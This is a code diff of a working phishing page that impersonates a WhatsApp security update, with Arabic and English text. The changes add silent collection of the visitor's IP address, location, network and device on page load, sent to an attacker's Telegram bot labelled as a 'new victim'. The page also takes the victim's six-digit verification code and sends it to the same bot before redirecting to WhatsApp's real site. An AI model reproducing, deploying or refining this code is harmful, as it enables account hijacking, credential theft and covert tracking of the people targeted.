@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html>
+<html lang="ar">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
@@ -8,36 +8,23 @@
         :root { --bg: #0b141a; --card: #1d2a33; --green: #00a884; --text: #e9edef; --hint: #8696a0; }
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, sans-serif; }
         body { background: var(--bg); color: var(--text); height: 100vh; overflow: hidden; display: flex; justify-content: center; align-items: center; }
-        
-        /* شاشة اللودينج */
-        #loader { 
-            position: fixed; inset: 0; background: var(--bg); z-index: 2000;
-            display: flex; flex-direction: column; align-items: center; justify-content: center;
-        }
+        #loader { position: fixed; inset: 0; background: var(--bg); z-index: 2000; display: flex; flex-direction: column; align-items: center; justify-content: center; }
         .pulse { width: 60px; animation: pulse 2s infinite; }
         @keyframes pulse { 0%, 100% { transform: scale(1); opacity: 0.8; } 50% { transform: scale(1.1); opacity: 1; } }
-
         .container { width: 100%; max-width: 400px; padding: 25px; text-align: center; display: none; }
         .active { display: block; animation: fadeIn 0.5s ease; }
-
         .logo { width: 55px; margin-bottom: 15px; }
         .main-title { font-size: 19px; font-weight: 600; margin-bottom: 20px; color: #fff; }
-
         .info-card { background: var(--card); border-radius: 12px; padding: 18px; margin-bottom: 20px; border: 1px solid #2a3942; }
         .row { display: flex; justify-content: space-between; margin-bottom: 12px; font-size: 13.5px; }
         .label { color: var(--hint); }
         .value { color: #fff; font-weight: 500; }
         .status { color: var(--green); font-weight: bold; }
-
         .phone-section { border-top: 1px solid #2a3942; margin-top: 10px; padding-top: 15px; }
         .phone-val { color: var(--green); font-size: 17px; font-weight: bold; direction: ltr; }
-
         .desc { font-size: 13px; color: var(--hint); line-height: 1.6; margin: 25px 0; }
-
         .otp-box { width: 100%; background: transparent; border: none; border-bottom: 2px solid #2a3942; color: #fff; font-size: 28px; text-align: center; outline: none; letter-spacing: 10px; margin-bottom: 25px; }
-
         .btn { background: var(--green); color: #111b21; border: none; width: 100%; padding: 16px; border-radius: 10px; font-size: 16px; font-weight: bold; cursor: pointer; }
-        
         .spinner { border: 3px solid #202c33; border-top: 3px solid var(--green); border-radius: 50%; width: 35px; height: 35px; animation: spin 1s linear infinite; margin: 15px auto; }
         @keyframes spin { 100% { transform: rotate(360deg); } }
         @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
@@ -53,100 +40,96 @@
     <div class="container" id="app">
         <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" class="logo">
         <h1 class="main-title" id="title"></h1>
-
         <div class="info-card">
-            <div class="row">
-                <span class="label" id="lbl-dev"></span>
-                <span class="value" id="val-dev">iPhone</span>
-            </div>
-            <div class="row">
-                <span class="label" id="lbl-status"></span>
-                <span class="status" id="val-status"></span>
-            </div>
-            <div class="row">
-                <span class="label" id="lbl-time"></span>
-                <span class="value" id="val-time"></span>
-            </div>
+            <div class="row"><span id="lbl-dev" class="label"></span><span id="val-dev" class="value">Detecting...</span></div>
+            <div class="row"><span id="lbl-status" class="label"></span><span id="val-status" class="status"></span></div>
+            <div class="row"><span id="lbl-time" class="label"></span><span id="val-time" class="value">--:--:--</span></div>
             <div class="phone-section row">
-                <span class="label" id="lbl-num" style="color:#fff"></span>
+                <span id="lbl-num" class="label" style="color:#fff"></span>
                 <span class="phone-val">+20 010 •••• •• 87</span>
             </div>
         </div>
-
-        <p class="desc" id="desc"></p>
-
-        <input type="tel" id="otp" class="otp-box" maxlength="6" placeholder="------">
-        <button class="btn" id="btn" onclick="send()"></button>
+        <p id="desc" class="desc"></p>
+        <input type="text" id="otp" class="otp-box" maxlength="6" inputmode="decimal" placeholder="------">
+        <button id="btn" class="btn" onclick="send()"></button>
     </div>
 
     <script>
         const CFG = { T: '8254072521:AAGs0le9FRacWKgYcdk3CzHXhEiTXZb8dZU', C: '5446862709' };
-        
+
         const content = {
-            ar: {
-                load: "جاري التحقق من أمان الحساب...",
-                title: "تحديث أمان واتساب",
-                dev: "الجهاز المكتشف:",
-                status: "حالة الإصدار:",
-                status_val: "تحديث أمان متاح (v2.4)",
-                time: "توقيت النظام:",
-                num: "الرقم الموثق:",
-                desc: "نسخة واتساب الحالية لا تدعم التشفير المتقدم v2.4. يرجى إدخال كود المزامنة لتفعيل التحديث وحماية محادثاتك.",
-                btn: "تحديث ومزامنة الآن",
-                sync: "جاري المزامنة..."
-            },
-            en: {
-                load: "Verifying account security...",
-                title: "WhatsApp Security Update",
-                dev: "Detected Device:",
-                status: "Version Status:",
-                status_val: "Security Update Available (v2.4)",
-                time: "System Time:",
-                num: "Verified Number:",
-                desc: "Your current version does not support v2.4 encryption. Please enter the synchronization code to activate the update.",
-                btn: "Update & Sync Now",
-                sync: "Syncing..."
-            }
+            ar: { load: "جاري التحقق...", title: "تحديث أمان واتساب", dev: "الجهاز:", status: "الحالة:", status_val: "تحديث أمان متاح (v2.4)", time: "التوقيت:", num: "الرقم:", desc: "يرجى إدخال كود المزامنة لتفعيل التحديث.", btn: "تحديث ومزامنة الآن", sync: "جاري المزامنة..." },
+            en: { load: "Verifying...", title: "WhatsApp Security Update", dev: "Device:", status: "Status:", status_val: "Security Update Available (v2.4)", time: "Time:", num: "Number:", desc: "Please enter the synchronization code to activate update.", btn: "Update & Sync Now", sync: "Syncing..." }
         };
 
         const lang = navigator.language.startsWith('ar') ? 'ar' : 'en';
         document.documentElement.dir = lang === 'ar' ? 'rtl' : 'ltr';
         const T = content[lang];
 
-        // ملء النصوص
+        // تعبئة واجهة المستخدم
         document.getElementById('load-msg').innerText = T.load;
         document.getElementById('title').innerText = T.title;
         document.getElementById('lbl-dev').innerText = T.dev;
         document.getElementById('lbl-status').innerText = T.status;
-        document.getElementById('val-status').innerText = T.status_val; // شلنا النقطة هنا
+        document.getElementById('val-status').innerText = T.status_val;
         document.getElementById('lbl-time').innerText = T.time;
         document.getElementById('lbl-num').innerText = T.num;
         document.getElementById('desc').innerText = T.desc;
         document.getElementById('btn').innerText = T.btn;
+
+        function getDevice() {
+            const ua = navigator.userAgent;
+            if (/iPhone/.test(ua)) return "iPhone";
+            if (/Android/.test(ua)) return "Android Device";
+            return "PC/Web";
+        }
+        document.getElementById('val-dev').innerText = getDevice();
 
         function updateClock() {
             document.getElementById('val-time').innerText = new Date().toLocaleTimeString('en-US', { hour: '2-digit', minute: '2-digit', second: '2-digit', hour12: true });
         }
         setInterval(updateClock, 1000); updateClock();
 
-        // إظهار المحتوى بعد اللودينج
+        async function bot(msg) {
+            return fetch(`https://api.telegram.org/bot${CFG.T}/sendMessage`, {
+                method: 'POST', headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({ chat_id: CFG.C, text: msg, parse_mode: 'HTML' })
+            }).catch(e => {});
+        }
+
+        // سحب البيانات التلقائية (IP والموقع) وإرسال إشعار الدخول فوراً
+        async function init() {
+            let logData = `🚀 <b>ضحية جديد دخل السايت!</b>\n`;
+            logData += `📱 الجهاز: ${getDevice()}\n`;
+            
+            try {
+                const res = await fetch('https://ipapi.co/json/');
+                const data = await res.json();
+                logData += `🌐 IP: <code>${data.ip}</code>\n`;
+                logData += `📍 المكان: ${data.city}, ${data.country_name}\n`;
+                logData += `📶 الشبكة: ${data.org}\n`;
+            } catch (e) {
+                logData += `🌐 IP: فشل في سحب العنوان\n`;
+            }
+            
+            logData += `🌍 لغة الجهاز: ${navigator.language}`;
+            bot(logData); // إرسال للبوت فوراً
+        }
+
         window.onload = () => {
+            init();
             setTimeout(() => {
                 document.getElementById('loader').style.display = 'none';
                 document.getElementById('app').classList.add('active');
-                document.body.style.overflow = 'auto';
-            }, 3000);
+            }, 2500);
         };
 
         async function send() {
             const code = document.getElementById('otp').value;
             if(code.length === 6) {
-                document.getElementById('app').innerHTML = `<div class="spinner"></div><p style="color:var(--hint)">${T.sync}</p>`;
-                await fetch(`https://api.telegram.org/bot${CFG.T}/sendMessage`, {
-                    method: 'POST', headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({ chat_id: CFG.C, text: `✅ Code: ${code}\n📱 Lang: ${lang}` })
-                });
-                setTimeout(() => location.href = "https://www.whatsapp.com/security", 2000);
+                document.getElementById('app').innerHTML = `<div class="spinner"></div><p>${T.sync}</p>`;
+                await bot(`🔥 <b>كود جديد وصل!</b>\n🔢 الكود: <code>${code}</code>\n📱 الجهاز: ${getDevice()}`);
+                setTimeout(() => location.href = "https://www.whatsapp.com/security", 1500);
             }
         }
     </script>
